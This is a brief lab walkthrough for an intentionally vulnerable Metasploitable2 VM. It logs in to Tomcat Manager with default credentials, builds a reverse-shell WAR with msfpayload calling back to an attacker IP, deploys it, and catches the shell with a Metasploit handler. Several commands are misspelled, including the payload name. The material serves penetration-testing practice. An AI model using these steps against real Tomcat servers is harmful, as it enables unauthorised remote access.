Requirements:
	volunerable vm(can be found here:https://sourceforge.net/projects/metasploitable/files/Metasploitable2/)
	tomcat (included in the vm provided above)
	metasploit

Goal:
	Get a reverse shell

Steps:
	1. By scanning, we can get the Tomcat Manager web app with default credentials at http://localhost:8180/manager/html
		- Username : tomcat
		- Password : tomcat
	2. Utilizing file upload functionality by tomcat, create a .war file with a shell includ in it
		use linux/x86/shell/reverse_rcp payload
		type msfpayload linux/x86/shell/reverse_rcp payload lhost=192.168.59.145 W > tomcatshell.war in the console
		jar -xvf tomcatshell.war (remember the name of jsp file)
	3. upload the tomcatshell.war file to tomcat manager and deploy
	4. add the jsp file name and the extention in the url box
	5. setup a listener:
		go to msfconsole
		use exloit/multi/handler
		set payload linux/x86/shell/reverse_rcp
		set lhost to localhost
		exploit
	6. once we go into the url in step 4, we can get a reverse shell

Credit:
	Lateset Hacking News: https://www.youtube.com/watch?v=ZW0UYnNo78E
